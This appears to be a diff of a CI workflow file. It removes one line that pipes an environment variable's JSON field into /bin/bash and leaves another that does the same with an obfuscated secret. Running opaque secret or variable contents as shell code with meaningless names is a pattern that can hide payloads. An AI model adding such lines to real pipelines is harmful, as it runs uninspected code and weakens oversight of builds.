@@ -21,7 +21,6 @@ jobs:
           gtazr5: ${{ secrets.gtazr5 }}
         run: |
           printf '%s' "$gtazr5" | jq -r .jder0595 | /bin/bash
-          echo $unysf0 | jq -r .pjla0 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
